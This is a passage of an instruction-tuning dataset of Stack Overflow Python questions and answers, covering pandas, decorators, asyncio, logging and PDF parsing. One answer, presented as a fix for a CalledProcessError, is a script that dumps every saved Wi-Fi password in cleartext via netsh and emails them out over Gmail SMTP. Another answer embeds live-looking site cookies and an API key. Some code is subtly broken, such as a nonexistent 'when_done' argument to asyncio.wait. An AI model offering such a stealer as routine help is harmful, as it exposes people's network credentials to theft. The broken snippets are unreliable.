_cython_agg_general(self, how, alt, numeric_only, min_count)\n   1002     ) -&gt; DataFrame:\n   1003         agg_blocks, agg_items = self._cython_agg_blocks(\n-&gt; 1004             how, alt=alt, numeric_only=numeric_only, min_count=min_count\n   1005         )\n   1006         return self._wrap_agged_blocks(agg_blocks, items=agg_items)\n\n\/anaconda\/envs\/sklearnEnv\/lib\/python3.6\/site-packages\/pandas\/core\/groupby\/generic.py in _cython_agg_blocks(self, how, alt, numeric_only, min_count)\n   1065 \n   1066             finally:\n-&gt; 1067                 assert not isinstance(result, DataFrame)\n   1068 \n   1069                 if result is not no_result:\n\nAssertionError: \n<\/code><\/pre>\n<p>The datatypes of <code>maintenance dataframe<\/code> is<\/p>\n<pre><code>&lt;class 'pandas.core.frame.DataFrame'&gt;\nInt64Index: 1038 entries, 0 to 1046\nData columns (total 5 columns):\n #   Column     Non-Null Count  Dtype         \n---  ------     --------------  -----         \n 0   Asset      1038 non-null   object        \n 1   Type       1038 non-null   object        \n 2   datetime   1038 non-null   datetime64[ns]\n 3   machineID  1038 non-null   int64         \n 4   comp       1038 non-null   object        \ndtypes: datetime64[ns](1), int64(1), object(3)\nmemory usage: 48.7+ KB\n<\/code><\/pre>","output_text":"<p>If we defined your maintenance dataframe as <code>maint_df<\/code> and your failure dataframe as <code>fail_df<\/code>, the following code should do the trick<\/p>\n<pre class=\"lang-py prettyprint-override\"><code># 1) Remove duplicates in maintenance dataframe, by getting the latest maintenance date\n#    for each combination of machineID and comp\nmaint_df = maint_df.groupby(['machineID', 'comp']).max().reset_index()\n\n# 2) Merge the two dataframes so we have maintenance and failure dates for each \n#    combination\nfail_df = fail_df.rename(columns={'failure': 'comp'})  # Rename column allowing the merge\nmerged = maint_df.merge(fail_df, \n                        on=['machineID', 'comp'], \n                        suffixes=('_maintenance', '_failure'))\n\n# 3) Filter out rows where maintenance date isn't older than failure date\nmerged = merged[merged['datetime_maintenance'] &lt; merged['datetime_failure']]\n\n# 4) Calculate the day difference between the two dates. \n#    NB: This assumes your date columns are strings - if they are already date objects, \n#    you can remove the strptime\nmerged['diff_days'] = merged.apply(\n    lambda x: (dt.datetime.strptime(x.datetime_failure, '%Y-%m-%d') - \n               dt.datetime.strptime(x.datetime_maintenance, '%Y-%m-%d')).days, \n    axis=1)\n\n# 5) Average the day difference across machineID and comp\nprint(merged.groupby(['machineID', 'comp']).mean())\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Getting read_data() missing 1 required positional argument: 'query' error even after passing the query in Python<p>I have this set in queries.<\/p>\n<pre><code>select_queries = {\n    'select_mics_for_year': '''\n          select distinct eh.segment_mic_code \n               from market_data.exchange_holiday eh \n               where date_part('year',eh.holiday_date) = {}\n               and eh.is_substituted = false;\n     '''}\n<\/code><\/pre>\n<p>I have this class where I am calling this query<\/p>\n<pre><code>def getTreasurySharesReport():\n    print('getTreasury')\n    #db_base.read_data(treasuryShares['get_treasury_shares'])\n\n    db_base.DBInteraction.read_data(select_queries ['select_mics_for_year'],chunk_size=10000000, auto_close_connection=False)\n    for row in treasuryShares:\n        print(row[0])\n\n\n\ngetTreasurySharesReport()\n<\/code><\/pre>\n<p>I am getting the following error.\ndb_base.DBInteraction.read_data(query,chunk_size=10000000, auto_close_connection=False)\nTypeError: read_data() missing 1 required positional argument: 'query'<\/p>\n<p>I have passed the query but still getting the error.<\/p>","output_text":"<p>I assume you need to pass the argument to the query, here:\n...\ndate_part('year',eh.holiday_date) = <strong>{}<\/strong><\/p>\n<p>like:\ndb_base.DBInteraction.read_data(select_queries ['select_mics_for_year'].<em>format<\/em>(<em><strong>&lt;&lt; Your input argument&gt;&gt;<\/strong><\/em>),chunk_size=10000000, auto_close_connection=False)<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to login to site and get a cookies by python<p>How can I login to this <a href=\"https:\/\/shahid.mbc.net\/en\/widgets\/login\" rel=\"nofollow noreferrer\">site<\/a> and get cookies after login by Python? I tried to use <code>requests<\/code> but failed.<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>import requests\nurl = 'https:\/\/shahid.mbc.net\/en\/widgets\/login'\nLogin = {'email': 'mail@mail.com',\n      'password': 'pass'}\nresponse = requests.get(url,data=Login)\nprint (response.headers)\nprint (response.cookies)\n<\/code><\/pre>\n<p>Thank you.<\/p>","output_text":"<p>You have to change your email, password and apikey to login in successfully. You will find apikey in network tab. For that you can follow Google Chrome's Dev Tool Network Tab &gt; XHR.<\/p>\n<pre><code>import requests\n\nwith requests.Session() as req:\n    headers = {\n        'authority': 'login.mbc.net',\n        'pragma': 'no-cache',\n        'cache-control': 'no-cache',\n        'sec-ch-ua': '&quot;Chromium&quot;;v=&quot;88&quot;, &quot;Google Chrome&quot;;v=&quot;88&quot;, &quot;;Not A Brand&quot;;v=&quot;99&quot;',\n        'sec-ch-ua-mobile': '?0',\n        'user-agent': 'Mozilla\/5.0 (X11; Linux x86_64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/88.0.4324.182 Safari\/537.36',\n        'content-type': 'application\/x-www-form-urlencoded',\n        'accept': '*\/*',\n        'origin': 'https:\/\/shahid.mbc.net',\n        'sec-fetch-site': 'same-site',\n        'sec-fetch-mode': 'cors',\n        'sec-fetch-dest': 'empty',\n        'referer': 'https:\/\/shahid.mbc.net\/',\n        'accept-language': 'en-US,en;q=0.9',\n        'cookie': '_gcl_au=1.1.1199633606.1614921781; WZRK_G=38c72e930fdb4b74837aa643dc47b107; _ga=GA1.1.1880367528.1614921781; _scid=a233719a-6581-477a-a7db-7111775ad5d2; gmid=gmid.ver4.AcbHoSuw-Q.WFFC0rz1YY3Z8Jkf3PSY2-d85Q20q4ngU541yDeCdCPz9Jb4_6zdRw9_rHKK7NHL.4vpNb7p4gJcxVMMRVoaPaKM774BnYDXqsNqgEqF8-DNz6t5OzbeAT9DpKFeAh6cnMbi_rbYE-mVIQT7isOAPIg.sc3; ucid=ctWpLfyUS5YIrftLu6u8-w; hasGmid=ver4; gig_bootstrap_3_Pm0x4fe9XSy6gv04PewESwqZ_HLgUCbXwWWPHCbGmUGFbW1xyHa42dFt0XTVay0T=login_ver4; _fbp=fb.1.1614921782478.439841241; _sctr=1|1614880800000; PAPVisitorId=JL2A8d7cVVZ64SlP4IkRS6AFl9t5nmdv; _ga_9ZLGVMG0QJ=GS1.1.1614921780.1.1.1614924710.2; WZRK_S_65W-567-675Z=%7B%22p%22%3A12%2C%22s%22%3A1614921781%2C%22t%22%3A1614924710%7D',\n    }\n\n    data = {\n      'loginID': 'Your email', # registered Email\n      'password': 'your password',\n      'sessionExpiration': '0',\n      'targetEnv': 'jssdk',\n      'include': 'profile,data',\n      'includeUserInfo': 'true',\n      'lang': 'en',\n      'APIKey': '3_Pm0x4fe9XSy6gv04PewESwqZ_HLgUCbXwWWPHCbGmUGFbW1xyHa42dFt0XTVay0T', # Your apikey\n      'sdk': 'js_latest',\n      'authMode': 'cookie',\n      'pageURL': 'https:\/\/login.mbc.net\/accounts.login',\n      'sdkBuild': '11903',\n      'format': 'json'\n    }\n    req.headers.update(headers)\n    r = req.post('https:\/\/login.mbc.net\/accounts.login',data=data)\n    print(r.json()['statusCode']) # 200\n    print(r.json()['isRegistered']) # True\n    print(r.json()['profile']) # {'email': 'XXX@yyyy.com'}\n<\/code><\/pre>\n<p>for the successful login output will be:<\/p>\n<pre><code>statusCode= 200\nisRegistered= True\nprofile= {'email': 'XXX@yyyy.com'}\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n python decorator on class: TypeError: super() argument 1 must be type, not function<p>I am using decorators on top of classes to register components. Here is my code<\/p>\n<pre><code>import functools\nregistry = {}\n\ndef register(name=None):\n    &quot;&quot;&quot;A decorator for registering modules\n    :param name: (optional) name for component\n    &quot;&quot;&quot;\n    def _wrap_func(func):\n        registry[name or func.__name__] = func\n\n        @functools.wraps(func)\n        def _wrap_args(*args, **kwargs):\n            return func(*args, **kwargs)\n\n        return _wrap_args\n    return _wrap_func\n\nclass Base:\n\n    def __init__(self, arg):\n        self.arg = arg\n\n@register(name=&quot;module1&quot;)\nclass Module1(Base):\n\n    def __init__(self, arg):\n        super(Module1, self).__init__(arg=arg)\n        # super().__init__(arg=arg)\n\n@register(name=&quot;module2&quot;)\nclass Module2(Base):\n\n    def __init__(self, arg):\n        super(Module2, self).__init__(arg=arg)\n<\/code><\/pre>\n<p>So far good. The <code>registry<\/code> and <code>register<\/code> works as expected<\/p>\n<pre><code>print(registry)\n# {'module1': &lt;class '__main__.Module1'&gt;, 'module2': &lt;class '__main__.Module2'&gt;}\n<\/code><\/pre>\n<p>But, calling the constructor on decorated classes throws an error.<\/p>\n<pre><code>module1 = Module1(arg='some1')\nprint(module1)\n\nTraceback (most recent call last):\n  File &quot;\/tmp.py&quot;, line xx, in &lt;module&gt;\n    module1 = Module1(arg='some1')\n  File &quot;\/tmp.py&quot;, line xx, in _wrap_args\n    return func(*args, **kwargs)\n  File &quot;\/tmp.py&quot;, line xx, in __init__\n    super(Module1, self).__init__(arg=arg)\nTypeError: super() argument 1 must be type, not function\n<\/code><\/pre>\n<p>I assumed <code>functools.wraps<\/code> took care of hiding the decorator, but here it is not.\nIf I change <code>super(Module1, self).__init__(arg=arg)<\/code> to <code>super().__init__(arg=arg)<\/code>, it works!\nIs this an expected behavior with decorators or is there something wrong with my definition of <code>registry()<\/code> function?<\/p>\n<hr \/>\n<p>EDIT: I lately discovered that inheritance is broken<\/p>\n<pre><code>@register(name=&quot;module3&quot;)\nclass Module3(Module1):\n    pass\n<\/code><\/pre>\n<p>leads to<\/p>\n<pre><code>Traceback (most recent call last):\n  File &quot;tmp.py&quot;, line xx, in &lt;module&gt;\n    class Module3(Module1):\nTypeError: function() argument 'code' must be code, not str\n<\/code><\/pre>\n<p>I understand that the decorated class becomes a function, but how to fix this? Its just not so obvious from documentation.<\/p>\n<ol>\n<li><p>I have referred to <a href=\"https:\/\/www.python.org\/dev\/peps\/pep-3129\/\" rel=\"nofollow noreferrer\">PEP-3129<\/a> and they say\n<em>For a detailed examination of decorators, please refer to <a href=\"https:\/\/www.python.org\/dev\/peps\/pep-0318\" rel=\"nofollow noreferrer\">PEP 318<\/a><\/em>\nNot a single example for class decorators with arguments!<\/p>\n<\/li>\n<li><p>Most useful documentation I've found is <a href=\"https:\/\/realpython.com\/primer-on-python-decorators\/#decorating-classes\" rel=\"nofollow noreferrer\"><em>Primer on decorators<\/em><\/a>\nThey left out class decorators <strong>with arguments<\/strong>.<\/p>\n<\/li>\n<\/ol>","output_text":"<p>I studied <code>@dataclass<\/code> implementation and found the correct way. <a href=\"https:\/\/www.python.org\/dev\/peps\/pep-3129\/#semantics\" rel=\"nofollow noreferrer\">Unlike what's said in docs and guides elsewhere<\/a>, Class decorator implementation is slightly different than function decorator -- we don't need to receive args and call it.<\/p>\n<p>Here is the one that works:<\/p>\n<pre><code>def register(cls=None, name=None):\n    &quot;&quot;&quot;\n    A decorator for registering modules\n    :param name: (optional) name for this component\n    &quot;&quot;&quot;\n    def _wrap_cls(cls):\n        registry[name or cls.__name__] = cls\n        return cls\n    if cls is None:\n        return _wrap_cls\n    else:\n        return _wrap_cls(cls)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n CalledProcessError for Subprocess.check_output for wlan in windows<p>I'm facing an error called CalledProcessError in Subprocess.Check_output module. Can anyone fix this?<\/p>","output_text":"<p>you program is  returning a non zero status which means that an error occurred during the processing of the command. You probably want to add some argument to your subprocess.check_output command to fix that.<\/p>\n<p>So i made some changes and i m still trying to get the Email pass Send main working. can you check if it works for you ?<\/p>\n<pre><code>import subprocess, smtplib, re\nimport sys\n\n\ndef send_mail(email, password, message):\n    server = smtplib.SMTP(&quot;smtp.gmail.com&quot;, 587)\n    server.starttls()\n    server.login(email, password)\n    server.sendmail(email, email, message)\n    server.quit()\n\n\ncommand = &quot;netsh wlan show profile&quot;\nnetworks = subprocess.check_output(command, shell=True ,stderr=subprocess.STDOUT)\nnetwork_names_list = re.findall(&quot;(?:Profile\\s*:\\s)(.*)&quot;, networks.decode(&quot;latin-1&quot;))\n\n\nresult = &quot;&quot;\n\nfor network_name in network_names_list:\n    try:\n        print(network_name)\n        command = &quot;netsh wlan show profile key=clear&quot; + &quot;&quot;.join(network_name)\n        current_result = str(subprocess.check_output(command, shell=True))\n        result = result + current_result\n        send_mail(&quot;email&quot;, &quot;pass&quot;, result)\n    except subprocess.CalledProcessError as e:\n        raise RuntimeError(&quot;command '{}' returns with error (code {}):{}&quot;.format(e.cmd,e.returncode,e.output))\n<\/code><\/pre>\n<p><a href=\"https:\/\/stackoverflow.com\/questions\/27920837\/subprocess-check-output-returned-non-zero-exit-status-1\">subprocess-check-output-returned-non-zero-exit-status<\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n PDF Text extraction and storing them as key-value pair<p>I want to extract text from a PDF. The output I am getting from text extraction is not that much organised.<\/p>\n<p>PDF Link (Only 1st Page): <a href=\"https:\/\/microprecision.com\/wp-content\/uploads\/2020\/08\/Sample-Cert_rev-7-1.pdf\" rel=\"nofollow noreferrer\">https:\/\/microprecision.com\/wp-content\/uploads\/2020\/08\/Sample-Cert_rev-7-1.pdf<\/a><\/p>\n<p>I want to extract parameters like MPC Control No #, Serial No., Model Number, etc. and may store them as key-value pair in dictionary.<\/p>\n<p>I am trying this with the below code but not getting the desired output.<\/p>\n<pre><code>import io\nfrom pdfminer.layout import LAParams, LTTextBox\nfrom pdfminer3.pdfpage import PDFPage\nfrom pdfminer3.pdfinterp import PDFResourceManager,PDFPageInterpreter\nfrom pdfminer3.converter import PDFPageAggregator,TextConverter\n\ndef pdftotext(path):\n   resource_manager = PDFResourceManager()\n   file_handle = io.StringIO()\nlaprams = LAParams(word_margin=1.0,boxes_flow=0.5,char_margin=2.0,line_overlap=0.5,line_margin=0.5)\n   converter = TextConverter(resource_manager,file_handle, laparams=laprams)\n   page_interpreter = PDFPageInterpreter(resource_manager,converter)\n   i = 1\n   with open(path,'rb') as fh:\n      for page in PDFPage.get_pages(fh,caching=False,check_extractable=True):\n        page_interpreter.process_page(page)\n        \n      text = file_handle.getvalue()\n\n   converter.close()\n   file_handle.close()\n\n   return text\n\n raw = pdftotext('Sample-Certificate.pdf')\n print(raw)\n<\/code><\/pre>","output_text":"<p>When working with PDF files I prefer to work with PyMuPDF library <a href=\"https:\/\/pypi.org\/project\/PyMuPDF\/\" rel=\"nofollow noreferrer\">https:\/\/pypi.org\/project\/PyMuPDF\/<\/a><\/p>\n<pre><code>import fitz\n\ntxt = []\ndoc = fitz.open(&quot;Sample-Cert_rev-7-1.pdf&quot;)            # some existing PDF\npage = doc[0]\ntext = page.getText(&quot;text&quot;)\ntxt = list(text)\nprint(text)\ntext = text.split('\\n')\ntxt = list(text)\nprint(txt)\nix = text.index('MPC Control #:')\nprint(ix)\nprint(text[ix+18])\n<\/code><\/pre>\n<p>Pay attention on how to install the library correctly<br \/>\nHere is the output:<\/p>\n<pre><code>&quot;C:\\Program Files\\Python38\\python.exe&quot; C:\/Python\/stackoverflow extract_pdf_text1.py\nMICRO PRECISION CALIBRATION, INC.\n22835 INDUSTRIAL PLACE\nGRASS VALLEY CA 95949\n530-268-1860\nCert No.\n551220083746791\nDate: Aug 3, 2020\nCertificate of Calibration\nAC-1969.00\nN\/A\nJuly 01, 2021\nN\/A\nCustomer:\nMPC Control #:\nAsset ID:\nGage Type:\nManufacturer:\nModel Number:\nSize:\nTemp\/RH:\nSerial Number:\nDepartment:\nPerformed By:\nReceived Condition:\nReturned Condition:\nCal. Date:\nCal. Interval:\nCal. Due Date:\nWork Order #:\nDIGITAL MULTIMETER\nDANNY BOY B. BUTIAL\n0258964\n0258964\nNONE\nAGILENT\n34401A\n10MHZ\nSAMPLE\nN\/A\nIN TOLERANCE\nIN TOLERANCE\n July 01, 2020\nN\/A\n12 MONTHS\nCalibration Notes:\nSAMPLE COMPANY\n23.0\u00b0C \/ 40.0%\nLocation:\nCalibration performed at MPC facility\nStandards Used to Calibrate Equipment\nI.D.\nDescription.\nModel\nSerial\nManufacturer\nCal. Due Date\nTraceability #\nPH1405\nMULTI-PRODUCT CALIBRATOR\n5520A\n7575006\nFLUKE\nSep 10, 2020\n551220083204793\nAL4394\nDIGITAL MULTIMETER\n3458A\n2823A09832\nAGILENT\nAug 1, 2020\n551220083719099\nProcedures Used in this Event\nProcedure Name\nDescription\nMPC Automated Procedure\nMPCCAL Rev. 00\nSTATEMENTS OF PASS OR FAIL CONFORMANCE: The uncertainty of measurement has been taken into account when determining compliance with specification. All measurements and test results guard banded to ensure the\nprobability of false-accept does not exceed 2% in compliance with ANSI\/NCSL Z540.3-2006 and in case without guard banded the probability of false-accept depending on test uncertainty ratio.\nTHE CALIBRATION REPORT STATUS:\nPASS- Term used when compliance statement is given, and the measurement result is PASS.\nPASSz- Term used when compliance statement is given, and the measurement result is conditional passed or PASSz.\nFAIL- Term used when compliance statement is given, and the measurement result is FAIL.\nFAILz- Term used when compliance statement is given, and the measurement result is conditional failed or FAILz.\nREPORT OF VALUE - Term used when reported measurement is not requiring compliance statement in report.\nADJUSTED- When adjustments are made to an instrument which changes the value of measurement from what was measured as found to new value as left.\nLIMITED - When an instrument fails calibration but is still functional in a limited manner.\nThe expanded uncertainty of measurement is stated as the standard uncertainty of measurement multiplied by the coverage factor k=2, which for a normal distribution corresponds to a coverage probability of approximately 95%, unless otherwise stated. This\ncalibration report complies with ISO\/IEC 17025:2017 and ANSI\/NCSL Z540.3. Calibration cycles and resulting due dates were submitted\/approved by the customer. Any number of factors may cause an instrument to drift out of tolerance before the next\nscheduled calibration. Recalibration cycles should be based on frequency of use, environmental conditions and customer's established systematic accuracy. All standards are traceable to SI through the National Institute of Standards and Technology (NIST)\nand\/or recognized national or international standards laboratories. Services rendered include proper manufacturer\u2019s service instruction and are warranted for no less than thirty (30) days. The information on this report pertains only to the instrument identified,\nthis may not be reproduced in part or in a whole without the prior written approval of the issuing MP Calibration Laboratory.\nRick Hernandez\nCalibrating Technician:\nQC Approval:\nDANNY BOY B. BUTIAL\n(CERT, Rev 7)\nPage 1 of 1\n\n['MICRO PRECISION CALIBRATION, INC.', '22835 INDUSTRIAL PLACE', 'GRASS VALLEY CA 95949', '530-268-1860', 'Cert No.', '551220083746791', 'Date: Aug 3, 2020', 'Certificate of Calibration', 'AC-1969.00', 'N\/A', 'July 01, 2021', 'N\/A', 'Customer:', 'MPC Control #:', 'Asset ID:', 'Gage Type:', 'Manufacturer:', 'Model Number:', 'Size:', 'Temp\/RH:', 'Serial Number:', 'Department:', 'Performed By:', 'Received Condition:', 'Returned Condition:', 'Cal. Date:', 'Cal. Interval:', 'Cal. Due Date:', 'Work Order #:', 'DIGITAL MULTIMETER', 'DANNY BOY B. BUTIAL', '0258964', '0258964', 'NONE', 'AGILENT', '34401A', '10MHZ', 'SAMPLE', 'N\/A', 'IN TOLERANCE', 'IN TOLERANCE', ' July 01, 2020', 'N\/A', '12 MONTHS', 'Calibration Notes:', 'SAMPLE COMPANY', '23.0\u00b0C \/ 40.0%', 'Location:', 'Calibration performed at MPC facility', 'Standards Used to Calibrate Equipment', 'I.D.', 'Description.', 'Model', 'Serial', 'Manufacturer', 'Cal. Due Date', 'Traceability #', 'PH1405', 'MULTI-PRODUCT CALIBRATOR', '5520A', '7575006', 'FLUKE', 'Sep 10, 2020', '551220083204793', 'AL4394', 'DIGITAL MULTIMETER', '3458A', '2823A09832', 'AGILENT', 'Aug 1, 2020', '551220083719099', 'Procedures Used in this Event', 'Procedure Name', 'Description', 'MPC Automated Procedure', 'MPCCAL Rev. 00', 'STATEMENTS OF PASS OR FAIL CONFORMANCE: The uncertainty of measurement has been taken into account when determining compliance with specification. All measurements and test results guard banded to ensure the', 'probability of false-accept does not exceed 2% in compliance with ANSI\/NCSL Z540.3-2006 and in case without guard banded the probability of false-accept depending on test uncertainty ratio.', 'THE CALIBRATION REPORT STATUS:', 'PASS- Term used when compliance statement is given, and the measurement result is PASS.', 'PASSz- Term used when compliance statement is given, and the measurement result is conditional passed or PASSz.', 'FAIL- Term used when compliance statement is given, and the measurement result is FAIL.', 'FAILz- Term used when compliance statement is given, and the measurement result is conditional failed or FAILz.', 'REPORT OF VALUE - Term used when reported measurement is not requiring compliance statement in report.', 'ADJUSTED- When adjustments are made to an instrument which changes the value of measurement from what was measured as found to new value as left.', 'LIMITED - When an instrument fails calibration but is still functional in a limited manner.', 'The expanded uncertainty of measurement is stated as the standard uncertainty of measurement multiplied by the coverage factor k=2, which for a normal distribution corresponds to a coverage probability of approximately 95%, unless otherwise stated. This', 'calibration report complies with ISO\/IEC 17025:2017 and ANSI\/NCSL Z540.3. Calibration cycles and resulting due dates were submitted\/approved by the customer. Any number of factors may cause an instrument to drift out of tolerance before the next', &quot;scheduled calibration. Recalibration cycles should be based on frequency of use, environmental conditions and customer's established systematic accuracy. All standards are traceable to SI through the National Institute of Standards and Technology (NIST)&quot;, 'and\/or recognized national or international standards laboratories. Services rendered include proper manufacturer\u2019s service instruction and are warranted for no less than thirty (30) days. The information on this report pertains only to the instrument identified,', 'this may not be reproduced in part or in a whole without the prior written approval of the issuing MP Calibration Laboratory.', 'Rick Hernandez', 'Calibrating Technician:', 'QC Approval:', 'DANNY BOY B. BUTIAL', '(CERT, Rev 7)', 'Page 1 of 1', '']\n13\n0258964\n\nProcess finished with exit code 0\n\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n listen to two websockets at the same time with asyncio<p>I' trying to listen to two websockets at the same time with asyncio. This doesn't work. How can I do this?<\/p>\n\n<p>I want to get whichever messages comes first, and print it out. <\/p>\n\n<pre><code>async with websockets.connect(sock_uri_1) as w1, \\\n            websockets.connect(sock_uri_2) as w2:\n\n        msg1 = ensure_future(w1.recv())\n        msg2 = ensure_future(w2.recv())\n        while True:\n            if msg1.done():\n               print(msg1.result())\n               msg1 = ensure_future(w1.recv())\n            if msg2.done():\n               print(msg1.result())\n               msg2 = ensure_future(w2.recv())\n            time.sleep(1) # Want to avoid this!\n\n<\/code><\/pre>","output_text":"<p>First, you should use <code>await asyncio.sleep(1)<\/code> rather than <code>time.sleep(1)<\/code>. Your approach can work without sleeping by using <code>asyncio.wait(when_done=FIRST_COMPLETED)<\/code> to wait for one (or both) of the messages to arrive:<\/p>\n\n<pre><code>async with websockets.connect(sock_uri_1) as w1, \\\n            websockets.connect(sock_uri_2) as w2:\n    msg1 = ensure_future(w1.recv())\n    msg2 = ensure_future(w2.recv())\n    while True:\n        await asyncio.wait([msg1, msg2], when_done=asyncio.FIRST_COMPLETED)\n        if msg1.done():\n           print(msg1.result())\n           msg1 = ensure_future(w1.recv())\n        if msg2.done():\n           print(msg1.result())\n           msg2 = ensure_future(w2.recv())\n<\/code><\/pre>\n\n<p>I find managing explicit tasks somewhat tedious, especially when the number of sources can vary. In this case I'd use a queue to combine the messages into a single channel:<\/p>\n\n<pre><code>async with websockets.connect(sock_uri_1) as w1, \\\n            websockets.connect(sock_uri_2) as w2:\n    channel = asyncio.Queue()\n    async def transmit(w, source):\n        while True:\n            msg = await w.recv()\n            await channel.put((source, msg))\n    asyncio.create_task(transmit(w1, 'source1')\n    asyncio.create_task(transmit(w2, 'source2')\n    while True:\n        source, msg = await channel.get()\n        if source == 'source1':\n            print(sock_uri_1, msg)\n        elif source == 'source2':\n            print(sock_uri_2, msg)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Python: pass log file directory as an argument<p>In my Python script, I have a logger defined as follows:<\/p>\n<pre><code>RUN_LOG_BASE_DIR='\/tmp\/'\nRUN_LOG_FILE_NAME = 'process_cc_log.txt'\n\nlogger = logging.getLogger(__name__)\nlogger.setLevel(logging.DEBUG)\n\nrunlog_formatter = logging.Formatter('%(asctime)s %(name)s line-%(lineno)d\\t\\t%(levelname)s\\t%(message)s')\nrunlog_handler = logging.handlers.TimedRotatingFileHandler(os.path.join(RUN_LOG_BASE_DIR, \n                RUN_LOG_FILE_NAME), when='midnight', backupCount=30)\nrunlog_handler.setLevel(logging.DEBUG)\nrunlog_handler.setFormatter(runlog_formatter)\nlogger.addhandler(runlog_handler)\n<\/code><\/pre>\n<p>I tried passing in the RUN_LOG_BASE_DIR as an argument(\/logs) to the main function, but it still writes to the \/tmp directory.<\/p>\n<p>main:<\/p>\n<pre><code>if __name__ == '__main__':\n    RUN_LOG_BASE_DIR = sys.argv[1]        \n<\/code><\/pre>\n<p>How do I pass the base directory as an argument?<\/p>","output_text":"<p>This is most likely because the code where you set up the logger runs before the <code>if __name__ == '__main__<\/code>.<\/p>\n<p>For example<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>MY_STRING = &quot;hello&quot;\nprint(MY_STRING)\n\nif __name__ == '__main__':\n   MY_STRING = &quot;goodbye&quot;\n<\/code><\/pre>\n<p>The above code will always print <code>hello<\/code>, because the print statement is run before the <code>if<\/code> check.<\/p>\n<p>However, if this was written as<\/p>\n<pre><code>def print_string(s):\n   print(s)\n\nif __name__ == &quot;__main__&quot;:\n   print(&quot;goodbye&quot;)\n<\/code><\/pre>\n<p>Then the program would accurately print out &quot;goodbye&quot;.<\/p>\n<p>A similar concept can be applied to your problem. Move your logging setup code inside a function, and then call the function with your desired logging dir.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n unable to initialize snowflake data source<p>I am trying to access the snowflake datasource using &quot;great_expectations&quot; library.<\/p>\n<p>The following is what I tried so far:<\/p>\n<pre><code>from ruamel import yaml\n\nimport great_expectations as ge\nfrom great_expectations.core.batch import BatchRequest, RuntimeBatchRequest\n\ncontext = ge.get_context()\n\n\n\ndatasource_config = {\n    &quot;name&quot;: &quot;my_snowflake_datasource&quot;,\n    &quot;class_name&quot;: &quot;Datasource&quot;,\n    &quot;execution_engine&quot;: {\n        &quot;class_name&quot;: &quot;SqlAlchemyExecutionEngine&quot;,\n        &quot;connection_string&quot;: &quot;snowflake:\/\/myusername:mypass@myaccount\/myDB\/myschema?warehouse=mywh&amp;role=myadmin&quot;,\n    },\n    &quot;data_connectors&quot;: {\n        &quot;default_runtime_data_connector_name&quot;: {\n            &quot;class_name&quot;: &quot;RuntimeDataConnector&quot;,\n            &quot;batch_identifiers&quot;: [&quot;default_identifier_name&quot;],\n        },\n        &quot;default_inferred_data_connector_name&quot;: {\n            &quot;class_name&quot;: &quot;InferredAssetSqlDataConnector&quot;,\n            &quot;include_schema_name&quot;: True,\n        },\n    },\n}\n\nprint(context.test_yaml_config(yaml.dump(datasource_config)))\n\n<\/code><\/pre>\n<p>I initiated great_expectation before executing above code:<\/p>\n<pre><code>great_expectations init\n<\/code><\/pre>\n<p>but I am getting the error below:<\/p>\n<pre><code>great_expectations.exceptions.exceptions.DatasourceInitializationError: Cannot initialize datasource my_snowflake_datasource, error: 'NoneType' object has no attribute 'create_engine'\n\n<\/code><\/pre>\n<p>What am I doing wrong?<\/p>","output_text":"<p>Your configuration seems to be ok, corresponding to the example <a href=\"https:\/\/github.com\/great-expectations\/great_expectations\/blob\/develop\/tests\/integration\/docusaurus\/connecting_to_your_data\/database\/snowflake_python_example.py\" rel=\"nofollow noreferrer\">here<\/a>.<\/p>\n<p>If you look at the traceback you should notice that the error propagates starting at the file <code>great_expectations\/execution_engine\/sqlalchemy_execution_engine.py<\/code> in your virtual environment.<\/p>\n<p>The actual line where the error occurs is:<\/p>\n<pre><code>            self.engine = sa.create_engine(connection_string, **kwargs)\n<\/code><\/pre>\n<p>And if you search for that <code>sa<\/code> at the top of that file:<\/p>\n<pre><code>import sqlalchemy as sa\n\nmake_url = import_make_url()\nexcept ImportError:\n        sa = None\n<\/code><\/pre>\n<p>So sqlalchemy is not installed, which you\ndon't get automatically in your environement if you install greate_expectiations. The thing to do is to\ninstall snowflake-sqlalchemy, since you want to use sqlalchemy's snowflake\nplugin (assumption based on your connection_string).<\/p>\n<pre><code>\/your\/virtualenv\/bin\/python -m pip install snowflake-sqlalchemy\n<\/code><\/pre>\n<p>After that you should no longer get an error, it looks like <code>test_yaml_config<\/code> is waiting for the connection\nto time out.<\/p>\n<p>What worries me greatly is the documented use of a deprecated API of <code>ruamel.yaml<\/code>.\nThe function <code>ruamel.yaml.dump<\/code> is going to be removed in the near future, and you\nshould use the <code>.dump()<\/code> method of a <code>ruamel.yaml.YAML()<\/code> instance.<\/p>\n<p>You should use the following code instead:<\/p>\n<pre><code>import sys\nfrom ruamel.yaml import YAML\n\nimport great_expectations as ge\ncontext = ge.get_context()\n\ndatasource_config = {\n    &quot;name&quot;: &quot;my_snowflake_datasource&quot;,\n    &quot;class_name&quot;: &quot;Datasource&quot;,\n    &quot;execution_engine&quot;: {\n        &quot;class_name&quot;: &quot;SqlAlchemyExecutionEngine&quot;,\n        &quot;connection_string&quot;: &quot;snowflake:\/\/myusername:mypass@myaccount\/myDB\/myschema?warehouse=mywh&amp;role=myadmin&quot;,\n    },\n    &quot;data_connectors&quot;: {\n        &quot;default_runtime_data_connector_name&quot;: {\n            &quot;class_name&quot;: 